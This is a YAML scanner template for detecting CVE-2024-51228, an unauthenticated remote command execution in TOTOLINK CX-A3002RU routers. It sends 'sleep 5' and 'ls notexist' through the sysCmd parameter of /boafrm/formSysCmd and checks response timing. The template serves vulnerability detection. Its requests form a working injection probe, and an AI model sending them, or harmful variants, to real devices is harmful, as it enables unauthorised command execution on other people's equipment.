id: CVE-2024-51228
info:
  name: TOTOLINK CX-A3002RU RCE
  author: ZacharyZcR
  severity: critical
  description: |
    A remote code execution vulnerability exists in TOTOLINK CX-A3002RU devices via formSysCmd.
    The vulnerability allows an unauthenticated attacker to execute arbitrary system commands through URL-encoded sysCmd parameter.
  reference:
    - https://xz.aliyun.com/t/16707

rules:
  r0:
    request:
      method: POST
      path: /boafrm/formSysCmd
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: sysCmd=sleep%205
    expression: |
      response.status == 302 && 
      response.headers["Server"].contains("Boa/0.94") &&
      response.headers["Location"] &&
      response.latency >= 5000

  r1:
    request:
      method: POST
      path: /boafrm/formSysCmd
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: sysCmd=ls%20notexist
    expression: |
      response.status == 302 && 
      response.headers["Server"].contains("Boa/0.94") &&
      response.latency < 1000

expression: r0() && r1()